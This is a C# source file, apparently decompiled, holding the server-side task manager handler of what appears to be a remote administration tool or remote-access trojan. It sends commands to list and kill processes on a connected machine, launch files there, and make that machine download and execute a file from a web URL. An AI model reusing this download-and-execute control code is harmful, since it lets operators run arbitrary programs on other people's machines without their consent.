

using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using System.Threading;


namespace InvokedServer.Messages
{
	public class TaskManagerHandler : MessageProcessorBase<Process[]>
	{
		private readonly InvokedServer.Networking.Client _client;

		public event TaskManagerHandler.ProcessActionPerformedEventHandler ProcessActionPerformed;

		private void OnProcessActionPerformed(ProcessAction action, bool result)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(r =>
			{
				TaskManagerHandler.ProcessActionPerformedEventHandler processActionPerformed = this.ProcessActionPerformed;
				if (processActionPerformed == null)
					return;
				processActionPerformed((object)this, action, (bool)r);
			}), (object)result);
		}

		public TaskManagerHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message)
		{
			return message is DoProcessResponse || message is GetProcessesResponse;
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case DoProcessResponse message1:
					this.Execute(sender, message1);
					break;
				case GetProcessesResponse message2:
					this.Execute(sender, message2);
					break;
			}
		}

		public void StartProcess(string remotePath, bool isUpdate = false)
		{
			this._client.Send<DoProcessStart>(new DoProcessStart()
			{
				FilePath = remotePath,
				IsUpdate = isUpdate
			});
		}

		public void StartProcessFromWeb(string url, bool isUpdate = false, string fileExtension = "exe")
		{
			this._client.Send<DoProcessStart>(new DoProcessStart()
			{
				DownloadUrl = url,
				IsUpdate = isUpdate,
				fileExtension = fileExtension
			});
		}

		public void RefreshProcesses() => this._client.Send<GetProcesses>(new GetProcesses());

		public void EndProcess(int pid)
		{
			this._client.Send<DoProcessEnd>(new DoProcessEnd()
			{
				Pid = pid
			});
		}

		private void Execute(ISender client, DoProcessResponse message)
		{
			this.OnProcessActionPerformed(message.Action, message.Result);
		}

		private void Execute(ISender client, GetProcessesResponse message)
		{
			this.OnReport(message.Processes);
		}

		public delegate void ProcessActionPerformedEventHandler(
		  object sender,
		  ProcessAction action,
		  bool result);
	}
}